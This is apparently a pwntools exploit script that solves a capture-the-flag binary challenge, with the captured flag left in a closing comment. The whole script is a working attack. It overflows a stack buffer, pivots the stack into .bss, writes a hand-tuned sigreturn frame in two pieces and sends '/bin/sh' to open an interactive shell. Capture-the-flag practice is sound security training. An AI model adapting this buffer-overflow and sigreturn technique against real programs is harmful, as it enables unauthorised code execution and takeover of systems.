from pwn import *


elf = context.binary = ELF("./main")
p = process()
# p = remote("chal.wwctf.com", 7003)
syscall = 0x000000000040117c
read = 0x00000000004011a2
read_plt = 0x401050


# return to read and set rbp = bss
p.send(cyclic(256) + p64(elf.bss(0x500)) + p64(read))



# set the frame
frame = SigreturnFrame()
frame.rcx = 0x3b
frame.rsi = 0x404498
frame.rbp = 0 
frame.rax = 0 
frame.rip = elf.bss(0x500) 
frame.rbx = elf.bss(0x500) 
frame.eflags = syscall
print("frame",hex(len(frame)))
frame = bytes(frame)
frame = list(frame)
frame[8 * 5 + 8 * 19] = ord("A") - 0x10
frame = bytes(frame)



# wrote payload and half of the frame
print("payload in ",hex(elf.bss(0x500 - 0x100)))
p.send(flat({
    0x0: p64(read_plt) + p64(syscall) + frame[:0x60],
    0x78: cyclic(0x100 - 0x78),
    0x100: elf.bss(0x500 + 8 * 13),
    0x108: read,
}))


# write the other half, next to the old one
set_rsp_rbp = 0x4011c0
p.send(flat([
    frame[0x60:],
    cyclic(8),
    0x00000000004011bb,
    cyclic(88), 
    elf.bss(0x500 - 0x100 - 8),
    0x4011c0,
]))


input()

# send bin/sh and make it 0xf bytes for syscall 
cmd = b"/bin/sh\x00"
p.send(cmd +  b"\x00" * (15 - len(cmd)))

p.interactive()



# cs             0x33                51
# ss             0x2b                43
   
   

#    wwf{pr373nd_y0u_4r3_5l33p1n6_50_17_g035_fa5T3r}